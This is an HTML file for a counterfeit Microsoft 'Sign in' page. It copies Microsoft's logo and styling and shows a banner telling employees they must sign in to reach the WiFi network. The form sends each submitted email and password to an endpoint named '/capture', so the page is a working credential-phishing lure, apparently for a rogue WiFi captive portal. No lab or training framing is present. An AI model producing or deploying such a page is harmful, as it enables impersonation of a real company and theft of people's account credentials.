<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft - Sign In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f3f2f1;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #201f1e;
        }
        .container {
            background: white;
            padding: 44px;
            width: 440px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        .logo {
            margin-bottom: 24px;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .form-group {
            margin: 24px 0;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-size: 15px;
        }
        input {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #8a8886;
            font-size: 15px;
        }
        input:focus {
            border-color: #0078d4;
            outline: none;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #0078d4;
            color: white;
            border: none;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover { background: #106ebe; }
        .announcement {
            background: #fff4ce;
            border-left: 4px solid #ffb900;
            padding: 12px;
            margin-bottom: 20px;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="108" height="24" viewBox="0 0 108 24" fill="none">
                <rect width="10" height="10" fill="#F25022"/>
                <rect x="12" width="10" height="10" fill="#7FBA00"/>
                <rect y="12" width="10" height="10" fill="#00A4EF"/>
                <rect x="12" y="12" width="10" height="10" fill="#FFB900"/>
            </svg>
        </div>
        <h1>Sign in</h1>
        <p>to continue to Microsoft Services</p>

        <div class="announcement">
            <strong>WiFi Access Update:</strong> All employees must sign in to access WiFi network.
        </div>

        <form method="POST" action="/capture">
            <div class="form-group">
                <label>Email, phone, or Skype</label>
                <input type="text" name="username" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>
